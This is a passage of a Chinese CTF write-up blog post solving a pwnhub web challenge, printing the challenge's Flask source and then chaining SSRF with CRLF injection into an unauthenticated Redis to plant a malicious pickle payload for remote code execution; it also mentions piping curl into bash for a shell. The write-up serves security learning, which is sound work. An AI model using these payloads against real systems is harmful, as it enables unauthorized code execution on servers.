class="params">()</span>:</span></span><br><span class="line">    resp = make_response(redirect(url_for(<span class="string">'login'</span>)))</span><br><span class="line">    resp.set_cookie(<span class="string">'Cookie'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"error.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        port=<span class="number">5000</span>,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>从调用的包看到还有两个自定义的包。也一并读下来、<br>sipder.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.target_url = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getResponse</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = urllib.request.urlopen(self.target_url).read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            <span class="keyword">return</span> (info, <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="keyword">return</span> (err, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spiderFlag</span><span class="params">(self)</span>:</span></span><br><span class="line">        infos = self.__getResponse()</span><br><span class="line">        <span class="keyword">if</span> infos[<span class="number">1</span>]:</span><br><span class="line">            soup = BeautifulSoup(infos[<span class="number">0</span>])</span><br><span class="line">            flag = soup.find(id==<span class="string">'flag'</span>)</span><br><span class="line">            <span class="keyword">return</span> infos[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> flag.text</span><br><span class="line">        <span class="keyword">return</span> infos[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
+
+<p>user.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">-*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="comment"># here put the import lib</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,email,username,password)</span>:</span></span><br><span class="line">        self.email = email</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = md5(password.encode(encoding=<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line">        self.phone = <span class="literal">None</span></span><br><span class="line">        self.qqnumber = <span class="literal">None</span></span><br><span class="line">        self.intro = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_pass</span><span class="params">(self,password)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> password <span class="keyword">and</span> md5(password.encode(encoding=<span class="string">'utf8'</span>)).hexdigest() == self.password:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">modify_info</span><span class="params">(obj,dict)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> dict:</span><br><span class="line">            <span class="keyword">if</span> hasattr(obj,key) <span class="keyword">and</span> dict[key]!=<span class="string">''</span>:</span><br><span class="line">                setattr(obj,key,dict[key])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cookie</span><span class="params">(object)</span>:</span></span><br><span class="line">    __key = <span class="string">"abcd"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        __key = <span class="string">"abcd"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.mix_str = (self.username+Cookie.__key).encode(encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        self.md5_str = self.username+md5(self.mix_str).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> self.md5_str</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @create.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self,username)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(verify_cookie)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> verify_cookie:</span><br><span class="line">            username = verify_cookie[:<span class="number">-32</span>]</span><br><span class="line">            verify_str = verify_cookie[<span class="number">-32</span>:]</span><br><span class="line">            <span class="keyword">return</span> md5((username+Cookie.__key).encode(encoding=<span class="string">"utf8"</span>)).hexdigest()==verify_str</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<p>这里主要得到两个信息。redis无密码。且是用来存储cookie的。而cookie的值会被调用出来进行pickle的反序列化。</p>
+<p>不用说，我们也大致明白思路了：操作redis修改cookie键对应的值。用cookie刷新触发反序列化RCE。<br>这个考点在去年的swpuctf的web2中也出现过。可惜自己因为环境问题一直没能在buu上做。</p>
+<p>这里基于源码比较齐全。我就本地简单搭建了一个server。然后触发一个生成cookie存储的过程。看看大致的存储规律<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/3.PNG" alt><br>实际上就是以我们的cookie作为键，pickle的opcode作为值，比flask的默认存储直观很多。</p>
+<p>那么很简单了，我们生成下RCE代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">"__import__('os').system('echo `ls /` &gt; /tmp/byc')"</span>,))</span><br><span class="line">a = exp()</span><br><span class="line">s=pickle.dumps(a)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+<p>这里为了不给服务器带来困扰，直接把根目录ls的结果写到tmp目录下，然后我们就能用读文件的途径直接读了。</p>
+<p>命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aset &quot;byc40418e2b681af1051d6fcb32e3d3f7071f6&quot; &quot;\x80\x03cbuiltins\neval\nq\x00X7\x00\x00\x00__import__(&#39;os&#39;).system(&#39;echo &#96;ls &#x2F;&#96; &gt; &#x2F;tmp&#x2F;byc4&#39;)q\x01\x85q\x02Rq\x03.&quot;%0d%0apadding</span><br></pre></td></tr></table></figure>
+<p>开始我在担心编码问题。后来发现应该不用在意。直接用python3的opcode结果就可以了。<br>刷新下cookie对应页面,然后读文件<code>file:///tmp/byc4</code><br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/4.PNG" alt></p>
+<p>接下来就可以直接读flag了。当然后面我试了下直接用<code>curl xxx|bash</code>弹个shell也是可以的。方法有很多。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>两道题都算是php与redis以及python与redis的经典搭配了。当然redis的利用还有很多，以后会慢慢学习。</p>
+<p>然后RCTF险些爆零……calc这题真的是太考验基本功了。做的人心累。</p>
+<p>最后就要收心好好复习了。这学期大部分时间都花在了ctf上，课业不像以往那样心里有底了。感觉得好好复习一把。现在CTF马上也快打一年了，自己很高兴水平比以往要高了不少。但是自己作为x1c的web手，还是感觉实力跟别的强队相比差了不少。希望暑假能好好研究下自己想学的东西,尽量过的充实点吧。</p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+          
+        
+          
+            <p>本文永久链接是：<a href=https://www.bycsec.top/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/>https://www.bycsec.top/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-06-24T21:17:42+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Jun 24, 2020</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/wp/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>wp</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/redis/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>redis</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>hackthebox-Quick-一次艰难的渗透</p>
+                <p class='content'>因为现在还没有接到确切通知说是否考试,原本期末复习的计划也被打乱了。既然现在复习觉得有点亏，于是干脆去做做hackthebox的靶机算了，正好好久没写wp了2333。
+虽然没更新文章，但是其实自...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/05/24/GKCTF2020writeup/'>
+                <p class='title'>GKCTF2020writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>这周末打了两个比赛。BJDCTF3rd与GKCTF.这里个人认为GKCTF的题目收获挺多的,但是时间太紧，自己也在简单题上浪费了不少时间。所以把比赛时没来的及看或者没做出来的题都补全。
+
+
+
+c...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      
+      
+      
+      
+      
+        <section id="comments">
+          <div id="valine_container" class="valine_thread">
+            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+          </div>
+        </section>
+      
+      
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: '初探Redis-wdb玄武组ssrfme&pwnhub公开赛',
+      tools: true
+    }
+  </script>
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+  <section class="widget toc-wrapper shadow desktop mobile">
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯玄武组ssrfme"><span class="toc-text">网鼎杯玄武组ssrfme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnhub公开赛-七爪鱼-flag在线爬取系统"><span class="toc-text">pwnhub公开赛-七爪鱼 flag在线爬取系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:895531613@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/baiyecha404"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+        </div>
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="bycsec.top">Copyright © 2020 byc_404</a></p>
+
+        </div>
+      
+    
+      
+        <a href="https://bycsec.top/" target="_blank" class="codename">IGNITE</a>
+        , total visits
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          times
+        
+      
+    
+  </footer>
+
+<script>setLoadingBarProgress(80);</script>
+
+
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '8px',
+        duration: '800',
+        interval: '100',
+        scale: '1'
+      });
+    });
+  </script>
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function() {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/BBC19066-E176-47C2-9D22-48C81EE5DF6B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B951AE18-D431-417F-B3FE-A382403FF21B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/2884F904-F1F3-479E-AE27-5EBC291B63B0.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/250662D4-5A21-4AAA-BB63-CD25CF97CFF1.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('') {
+          $('').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>
+
+  
+  <script>
+  var GUEST_INFO = ['nick','mail','link'];
+  var meta = 'nick,mail,link'.split(',').filter(function(item){
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick','mail','link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function(item){
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+  var valine = new Valine();
+  function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  valine.init({
+    el: '#valine_container',
+    meta: meta,
+    
+    appId: "pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz",
+    appKey: "9HlyBGu0qm9EmkSNKD2qoBx4",
+    placeholder: "快来评论吧~",
+    pageSize:'10',
+    avatar:'robohash',
+    lang:'zh-cn',
+    visitor: 'true',
+    highlight: 'true',
+    mathJax: 'false',
+    enableQQ: 'true',
+    requiredFields: requiredFields,
+    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
+    emojiMaps: emojiMaps
+  })
+  </script>
+
+
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/app.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-check-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-check-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-times-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-times-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+<!-- fancybox -->
+
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  let LAZY_LOAD_IMAGE = "";
+  $(".article-entry").find("div.fancybox").find("img").each(function () {
+      var element = document.createElement("a");
+      $(element).attr("data-fancybox", "gallery");
+      $(element).attr("href", $(this).attr("src"));
+      /* 图片采用懒加载处理时,
+       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
+       * 那么此处将原本的属性名src替换为对应属性名data-original,
+       * 修改如下
+       */
+       if (LAZY_LOAD_IMAGE) {
+         $(element).attr("href", $(this).attr("data-original"));
+       }
+      $(this).wrap(element);
+  });
+</script>
+
+
+
+
+
+
+  <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
